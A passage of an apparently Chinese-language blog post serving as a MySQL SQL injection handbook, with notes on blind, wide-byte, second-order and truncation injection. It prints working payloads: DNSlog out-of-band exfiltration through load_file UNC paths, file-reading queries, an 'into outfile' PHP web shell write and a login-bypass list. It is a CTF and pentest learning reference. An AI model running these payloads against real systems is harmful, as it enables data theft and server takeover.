+<p>但是字符型又有另一个坑点<br>字符型在与数字进行与逻辑运算时会当被做0来处理，所以无法执行and后的sleep。<br>所以我们只能用 <code>or</code>,<code>||</code>,<code>xor</code>,<code>^</code>  </p>
+<p>但是或逻辑运算中同样存在问题</p>
+<p>（但是具体好像还和mysql版本有关，因为看别人blog字符+or也执行成功了，但是先先不填坑了）<br>测试只有字符为0时才会执行or后的sleep    </p>
+<p>应该是和逻辑运算的方式有关，或运算会先检验前面是否为真，只有当前面为字符0时才为假，这是和与运算的不同之处</p>
+<p>异或的坑点和或相似<br>当字符不为数字时不会执行，具体深层原因先留坑吧</p>
+<p>这里还有坑…</p>
+<p>or活着xor都可能导致多次sleep，因为每次检索都会or一次<br>实战中要尽量避免这个问题，能布尔盲注的时候就不要用sleep了<br>要避免这个问题就要用与逻辑且前面为真，放到where就是前面必须where一个存在的值  </p>
+<p>测试mysql版本5.3.72  </p>
+<h5 id="insert-delete"><a href="#insert-delete" class="headerlink" title="insert/delete"></a>insert/delete</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into users values (1,&apos;&#123;injecthere&#125;&apos;,&apos;password&apos;);</span><br></pre></td></tr></table></figure>
+<p>类似update，不赘述了    </p>
+<h4 id="Order-by注入"><a href="#Order-by注入" class="headerlink" title="Order by注入"></a>Order by注入</h4><p>本质仍然是盲注，根据order by 0 或者 1 返回不同的排序进行注入<br>ctf中的进阶形式为order by 一个特定字段<br>比如hctf中的一道题目  </p>
+<h4 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h4><p><strong>原理</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">mysql_query(<span class="string">"SET NAMES 'gbk'"</span>);</span><br><span class="line">....</span><br><span class="line">$name = <span class="keyword">isset</span>($_GET[<span class="string">'name'</span>]) ? addslashes($_GET[<span class="string">'name'</span>]) : <span class="number">1</span>;</span><br><span class="line">$sql = <span class="string">"SELECT * FROM test WHERE names='&#123;$name&#125;'"</span>;</span><br></pre></td></tr></table></figure></p>
+<p>即服务器使用了款字节编码，addslashes会将单引号转义，变为\‘,而宽子节会把两个字符编码为一个汉字，所以如果拼接%df，那%df%5c就会被编码为運字，从而逃逸出转义。  </p>
+<p>具体拼接什么要根据数据库使用的编码来决定，可以去查编码表。  </p>
+<p>常见payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1%df&apos; #</span><br></pre></td></tr></table></figure></p>
+<h4 id="Mysql约束攻击"><a href="#Mysql约束攻击" class="headerlink" title="Mysql约束攻击"></a>Mysql约束攻击</h4><p><strong>原理</strong><br>主要两个点  </p>
+<ul>
+<li><p>mysql的select查询进行字符串比较的时候,不同长度的字符串,会用空格填充到相同字符在比较。</p>
+</li>
+<li><p>mysql插入数据的时候,当数据超过定义的长度会出现截断象限</p>
+</li>
+</ul>
+<p>利用方式即注册一’admin      &#160;&#160;&#160;&#160;&#160;&#160;&#160;a’用户(中间空格超长截断)，达到超长截断的目的，往数据库中写入一个’admin&#160;&#160;&#160;&#160;&#160;&#160;’用户，而在select的过程中’admin      ‘是与’admin’相等的  </p>
+<p>所以就可以用’admin      ‘的密码登陆’admin’</p>
+<h4 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h4><p>所谓二次注入是指已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入。</p>
+<p>二次注入是sql注入的一种，但是比普通sql注入利用更加困难，利用门槛更高。普通注入数据直接进入到 SQL 查询中，而二次注入则是输入数据经处理后存储，取出后，再次进入到 SQL 查询。</p>
+<p>二次注入的原理，在第一次进行数据库插入数据的时候，仅仅只是使用了 addslashes 或者是借助 get_magic_quotes_gpc 对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据，但是数据本身还是脏数据。</p>
+<p>在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中取出了脏数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。比如在第一次插入数据的时候，数据中带有单引号，直接插入到了数据库中；然后在下一次使用中在拼凑的过程中，就形成了二次注入。</p>
+<p>这个。。只能具体情况分析了，不太好写</p>
+<p>比如sql lab-24</p>
+<h4 id="Mysql带外注入"><a href="#Mysql带外注入" class="headerlink" title="Mysql带外注入"></a>Mysql带外注入</h4><p>带外通道攻击主要是利用其他协议或者渠道从服务器提取数据<br>它可能是HTTP（S）请求，DNS解析服务，SMB服务，Mail服务等</p>
+<h5 id="DNSlog"><a href="#DNSlog" class="headerlink" title="DNSlog"></a>DNSlog</h5><p>只能用于windows环境  </p>
+<p>select拼接一个UNC路径导致请求发起<br>UNC是一种命名惯例, 主要用于在Microsoft Windows上指定和映射网络驱动器. UNC命名惯例最多被应用于在局域网中访问文件服务器或者打印机。我们日常常用的网络共享文件就是这个方式。<br>其实我们平常在Widnows中用共享文件的时候就会用到这种网络地址的形式</p>
+<p>\\sss.xxx\test\  </p>
+<p>常见payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&apos;\\\\&apos;,select hex(version()),&apos;.dnslog地址&apos;)</span><br></pre></td></tr></table></figure></p>
+<p>这也就解释了为什么CONCAT()函数拼接了4个\了，因为转义的原因，4个\就变成了2个\，目的就是利用UNC路径</p>
+<p>可以直接直接用ceye.io这个平台，这个平台就集成了Dnslog的功能  </p>
+<p>利用方法  </p>
+<p>首先查看变量确定权限<br>show variables like ‘%secure%’</p>
+<ul>
+<li>当secure_file_priv为空，就可以读取磁盘的目录。</li>
+<li>当secure_file_priv为G:\，就可以读取G盘的文件。</li>
+<li>当secure_file_priv为null，load_file就不能加载文件。  </li>
+</ul>
+<p>在mysql 5.5.34版本默认为空可以加载文件 但是之后版本为NULL会禁用函数但是<br>可以通过mysql的配置文件my.ini添加行进行配置  </p>
+<p>最好进行加密处理，防止特殊字符导致传输失败<br>payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(concat(0x5c5c5c5c,select hex(version()),0x2E66326362386131382E646E736C6F672E6C696E6B2F2F616263));</span><br></pre></td></tr></table></figure></p>
+<h4 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写"></a>文件读写</h4><p>查询用户读写权限<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT file_priv FROM mysql.user WHERE user = &apos;username&apos;;</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>load_file()</li>
+</ul>
+<p>需要有读取文件的权限<br>需要知道文件的绝对物理路径<br>要读取的文件大小必须小于 max_allowed_packet  </p>
+<p>一般没啥问题<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT @@max_allowed_packet;</span><br></pre></td></tr></table></figure></p>
+<p>一般用load_file来看config.php（即mysql的密码）,apache配置、servu密码等。前提是要知道物理路径。  </p>
+<p>常见paylaod<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">UNION SELECT LOAD_FILE(&quot;C://TEST.txt&quot;) #</span><br><span class="line">UNION SELECT LOAD_FILE(&quot;C:/TEST.txt&quot;) #</span><br><span class="line">UNION SELECT LOAD_FILE(&quot;C:\\TEST.txt&quot;) #</span><br></pre></td></tr></table></figure></p>
+<p>后面的路径可以是单引号、0x、char转换的字符<br>路径中的斜杠是/而不是\  </p>
+<p>使用编码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">UNION SELECT LOAD_FILE(CHAR(67,58,92,92,84,69,83,84,46,116,120,116)) #</span><br><span class="line">UNION SELECT LOAD_FILE(0x433a5c5c544553542e747874) #</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>out_file()</li>
+</ul>
+<p>outfile后面不能接0x开头或者char转换以后的路径，只能是单引号路径<br>经典一句话payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &apos;&lt;?php eval($_POST[cmd])?&gt;&apos; into outfile &apos;C:/www/shell.php&apos;</span><br></pre></td></tr></table></figure></p>
+<p>当然也可以从表中选数据写  </p>
+<h4 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">admin’ —</span><br><span class="line">admin’ #</span><br><span class="line">admin’/*</span><br><span class="line">or ‘=’ or</span><br><span class="line">‘ or 1=1—</span><br><span class="line">‘ or 1=1#</span><br><span class="line">‘ or 1=1/*</span><br><span class="line">‘) or ‘1’=’1—</span><br><span class="line">‘) or (‘1’=’1—</span><br></pre></td></tr></table></figure>
+<h3 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h3><h2 id="Sqlmap"><a href="#Sqlmap" class="headerlink" title="Sqlmap"></a>Sqlmap</h2><hr>
+<p>refer<br><a href="https://xz.aliyun.com/t/3992#toc-6" target="_blank" rel="noopener">https://xz.aliyun.com/t/3992#toc-6</a><br><a href="https://chybeta.github.io/2017/07/21/MySql%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98%E5%BD%95/" target="_blank" rel="noopener">https://chybeta.github.io/2017/07/21/MySql%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98%E5%BD%95/</a><br><a href="https://xz.aliyun.com/t/253" target="_blank" rel="noopener">https://xz.aliyun.com/t/253</a><br><a href="https://www.anquanke.com/post/id/85230" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85230</a><br><a href="https://www.freebuf.com/articles/web/167089.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/167089.html</a><br><a href="https://www.anquanke.com/post/id/98096" target="_blank" rel="noopener">https://www.anquanke.com/post/id/98096</a></p>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者：<a href="http://yoursite.com">N0rth3ty</a>
+            <p>原文链接：<a href="http://yoursite.com/2019/03/02/Sql注入手册/">http://yoursite.com/2019/03/02/Sql注入手册/</a>
+            <p>发表日期：<a href="http://yoursite.com/2019/03/02/Sql注入手册/">March 2nd 2019, 7:05:06 pm</a>
+            <p>更新日期：<a href="http://yoursite.com/2019/03/02/Sql注入手册/">March 2nd 2019, 7:10:07 pm</a>
+            <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2019/01/29/前端安全笔记/" title= "前端安全笔记">
+                    <div class="prevTitle">前端安全笔记</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:northbhat@gmail.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/northity" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#常见数据库搭配"><span class="toc-number">1.</span> <span class="toc-text">常见数据库搭配</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mysql"><span class="toc-number">2.</span> <span class="toc-text">Mysql</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#基础"><span class="toc-number">2.1.</span> <span class="toc-text">基础</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#数据库名"><span class="toc-number">2.1.1.</span> <span class="toc-text">数据库名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#当前登陆用户"><span class="toc-number">2.1.2.</span> <span class="toc-text">当前登陆用户</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#数据库版本"><span class="toc-number">2.1.3.</span> <span class="toc-text">数据库版本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#路径相关"><span class="toc-number">2.1.4.</span> <span class="toc-text">路径相关</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#字符串连接"><span class="toc-number">2.1.5.</span> <span class="toc-text">字符串连接</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#字符截断"><span class="toc-number">2.1.6.</span> <span class="toc-text">字符截断</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#字符串比较函数"><span class="toc-number">2.1.7.</span> <span class="toc-text">字符串比较函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#注释"><span class="toc-number">2.1.8.</span> <span class="toc-text">注释</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#运算符"><span class="toc-number">2.1.9.</span> <span class="toc-text">运算符</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#绕过函数"><span class="toc-number">2.1.10.</span> <span class="toc-text">绕过函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#延时函数"><span class="toc-number">2.1.11.</span> <span class="toc-text">延时函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#编码函数"><span class="toc-number">2.1.12.</span> <span class="toc-text">编码函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#文件函数"><span class="toc-number">2.1.13.</span> <span class="toc-text">文件函数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#构造语句"><span class="toc-number">2.2.</span> <span class="toc-text">构造语句</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#条件语句"><span class="toc-number">2.2.1.</span> <span class="toc-text">条件语句</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#information-schema-结构"><span class="toc-number">2.2.2.</span> <span class="toc-text">information_schema 结构</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Mysql注入语句一般形式"><span class="toc-number">2.2.3.</span> <span class="toc-text">Mysql注入语句一般形式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Mysql空白字符"><span class="toc-number">2.2.4.</span> <span class="toc-text">Mysql空白字符</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#判断注入是否存在"><span class="toc-number">2.3.</span> <span class="toc-text">判断注入是否存在</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#四大基本注入类型"><span class="toc-number">2.4.</span> <span class="toc-text">四大基本注入类型</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#UNION注入"><span class="toc-number">2.4.1.</span> <span class="toc-text">UNION注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#报错注入"><span class="toc-number">2.4.2.</span> <span class="toc-text">报错注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#布尔盲注"><span class="toc-number">2.4.3.</span> <span class="toc-text">布尔盲注</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#时间盲注"><span class="toc-number">2.4.4.</span> <span class="toc-text">时间盲注</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Mysql注入杂技"><span class="toc-number">2.5.</span> <span class="toc-text">Mysql注入杂技</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#insert-update-delete注入"><span class="toc-number">2.5.1.</span> <span class="toc-text">insert/update/delete注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#update"><span class="toc-number">2.5.1.1.</span> <span class="toc-text">update</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#insert-delete"><span class="toc-number">2.5.1.2.</span> <span class="toc-text">insert/delete</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Order-by注入"><span class="toc-number">2.5.2.</span> <span class="toc-text">Order by注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#宽字节注入"><span class="toc-number">2.5.3.</span> <span class="toc-text">宽字节注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Mysql约束攻击"><span class="toc-number">2.5.4.</span> <span class="toc-text">Mysql约束攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#二次注入"><span class="toc-number">2.5.5.</span> <span class="toc-text">二次注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Mysql带外注入"><span class="toc-number">2.5.6.</span> <span class="toc-text">Mysql带外注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#DNSlog"><span class="toc-number">2.5.6.1.</span> <span class="toc-text">DNSlog</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#文件读写"><span class="toc-number">2.5.7.</span> <span class="toc-text">文件读写</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#万能密码"><span class="toc-number">2.5.8.</span> <span class="toc-text">万能密码</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bypass"><span class="toc-number">2.6.</span> <span class="toc-text">bypass</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Sqlmap"><span class="toc-number">3.</span> <span class="toc-text">Sqlmap</span></a></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 35
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/02</span><a class="archive-post-title" href= "/2019/03/02/Sql注入手册/" >Sql注入手册</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/29</span><a class="archive-post-title" href= "/2019/01/29/前端安全笔记/" >前端安全笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/17</span><a class="archive-post-title" href= "/2019/01/17/JSONP劫持/" >JSONP劫持</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/27</span><a class="archive-post-title" href= "/2018/12/27/SWPUCTF复现/" >SWPUCTF复现</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/29</span><a class="archive-post-title" href= "/2018/11/29/BCTF-Web签到/" >BCTF Web签到</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/26</span><a class="archive-post-title" href= "/2018/11/26/Docker入门笔记/" >Docker入门笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/22</span><a class="archive-post-title" href= "/2018/11/22/PHP反序列化补充/" >PHP反序列化补充</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/19</span><a class="archive-post-title" href= "/2018/11/19/从LCTF-WEB签到题看PHP反序列化/" >从LCTF WEB签到题看PHP反序列化</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/14</span><a class="archive-post-title" href= "/2018/11/14/phpphar协议对象注入/" >phpphar协议对象注入</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/12</span><a class="archive-post-title" href= "/2018/11/12/HCTF-WEB部分题解/" >HCTF WEB部分题解</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/12</span><a class="archive-post-title" href= "/2018/11/12/上海大学生信息安全竞赛Web题解/" >上海大学生信息安全竞赛Web题解</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/09</span><a class="archive-post-title" href= "/2018/11/09/SECCON-Web/" >SECCON Web</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/26</span><a class="archive-post-title" href= "/2018/10/26/phpinfo-with-LFI/" >phpinfo with LFI</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/23</span><a class="archive-post-title" href= "/2018/10/23/XSSme题目复现/" >XSSme题目复现</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/21</span><a class="archive-post-title" href= "/2018/10/21/渗透测试0x00-信息收集/" >渗透测试0x00 信息收集</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/19</span><a class="archive-post-title" href= "/2018/10/19/提权从入门到自闭/" >提权从入门到自闭</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/17</span><a class="archive-post-title" href= "/2018/10/17/浅析SSTI/" >浅析SSTI</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/15</span><a class="archive-post-title" href= "/2018/10/15/Hash长度扩展攻击/" >Hash长度扩展攻击</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/15</span><a class="archive-post-title" href= "/2018/10/15/护网杯Web-WP/" >护网杯Web WP</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/01</span><a class="archive-post-title" href= "/2018/10/01/XSSbot从入门到放弃/" >XSSbot从入门到放弃</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/12</span><a class="archive-post-title" href= "/2018/09/12/网鼎杯第三场WP/" >网鼎杯第三场WP</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/11</span><a class="archive-post-title" href= "/2018/09/11/浅谈XXE漏洞/" >浅谈XXE漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/11</span><a class="archive-post-title" href= "/2018/09/11/网鼎杯第一场WP/" >网鼎杯第一场WP</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/12</span><a class="archive-post-title" href= "/2018/06/12/Bugku题目集锦0x02/" >Bugku题目集锦0x02</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/07</span><a class="archive-post-title" href= "/2018/06/07/Bugku题目集锦0x01/" >Bugku题目集锦0x01</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/25</span><a class="archive-post-title" href= "/2018/05/25/Bugku题目集锦0x00/" >Bugku题目集锦0x00</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/03</span><a class="archive-post-title" href= "/2018/05/03/CISN-Writeup/" >CISN-Writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/22</span><a class="archive-post-title" href= "/2018/04/22/DDctf-Writrup/" >DDctf_Writrup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/01</span><a class="archive-post-title" href= "/2018/04/01/强网杯web部分writeup/" >强网杯web部分writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/07</span><a class="archive-post-title" href= "/2018/02/07/Python笔记 0x01/" >Python笔记 0x01</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/07</span><a class="archive-post-title" href= "/2018/02/07/Python笔记 0x02/" >Python笔记 0x02</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/04</span><a class="archive-post-title" href= "/2018/02/04/Python爬虫(一)/" >Python爬虫(一)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/03</span><a class="archive-post-title" href= "/2018/02/03/Python笔记 0x00/" >Python笔记 0x00</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/24</span><a class="archive-post-title" href= "/2018/01/24/教务系统成绩自动化推送脚本/" >教务系统成绩自动化推送脚本</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2017 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/01</span><a class="archive-post-title" href= "/2017/12/01/hexo博客的搭建/" >hexo博客搭建</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="WP"><span class="iconfont-archer">&#xe606;</span>WP</span>
+    
+        <span class="sidebar-tag-name" data-tags="Writeup"><span class="iconfont-archer">&#xe606;</span>Writeup</span>
+    
